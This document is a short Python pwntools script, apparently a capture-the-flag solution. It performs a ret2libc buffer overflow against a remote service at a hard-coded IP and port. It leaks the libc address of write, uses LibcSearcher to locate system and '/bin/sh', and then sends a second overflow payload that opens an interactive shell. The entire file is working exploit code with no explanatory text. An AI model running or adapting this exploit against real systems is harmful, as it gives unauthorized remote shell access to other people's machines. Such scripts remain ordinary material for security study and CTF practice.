from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",35227)
elf=ELF("./elf")

write_plt=elf.plt['write']
write_got=elf.got['write']
vulnerable_function=0x0804844B

io.recvuntil("Input:\n")
payload1='a'*140+p32(write_plt)+p32(vulnerable_function)+p32(1)+p32(write_got)+p32(4)
io.sendline(payload1)
write_addr=u32(io.recv(4))
print "write_addr="+hex(write_addr)

libc=LibcSearcher("write",write_addr)
offset=write_addr-libc.dump('write')                   #offest
print "offset="+hex(offset)
system_addr=offset+libc.dump('system')
print "system_addr="+hex(system_addr)        #system offset
binsh_addr=offset+libc.dump('str_bin_sh')
print "binsh_addr="+hex(binsh_addr)    #/bin/sh offset

payload2='a'*140+p32(system_addr)+p32(0xdeadbeef)+p32(binsh_addr)
io.recv()
io.sendline(payload2)

io.interactive()
